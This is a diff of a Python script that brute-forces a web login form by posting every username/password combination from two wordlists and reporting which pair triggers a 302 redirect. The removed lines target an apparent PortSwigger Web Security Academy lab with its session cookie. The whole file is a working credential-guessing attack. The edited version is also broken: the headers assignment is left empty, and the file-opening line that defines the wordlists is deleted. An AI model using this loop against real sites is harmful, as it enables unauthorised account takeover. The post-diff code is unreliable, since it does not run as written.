@@ -1,16 +1,15 @@
 import requests
 
-burp0_url = "https://0a4800750333c89185232670005800db.web-security-academy.net:443/login"
-burp0_cookies = {"session": "5z4ciNuMecDCG7b5U4W5ZgUg1bkKBMMr"}
-burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a4800750333c89185232670005800db.web-security-academy.net", "Referer": "https://0a4800750333c89185232670005800db.web-security-academy.net/login", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Dnt": "1", "Sec-Gpc": "1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}
-with open("usernameList.txt",'r') as usernames,open ("passwordList.txt",'r') as passwords:
+url = ""
+cookies = {"session": ""}
+headers = 
     user_list=[u.strip() for u in usernames]
     password_list=[p.strip() for p in passwords]
     for username in user_list:
         for password in password_list:
             data={"username":username,"password":password}
             try:
-                r=requests.post(burp0_url,headers=burp0_headers,cookies=burp0_cookies,data=data,timeout=5,allow_redirects=False)
+                r=requests.post(url,headers=headers,cookies=cookies,data=data,timeout=5,allow_redirects=False)
                 print(f"trying {username}:{password} -> {r.status_code}")
                 if r.status_code ==302:
                     print (username)
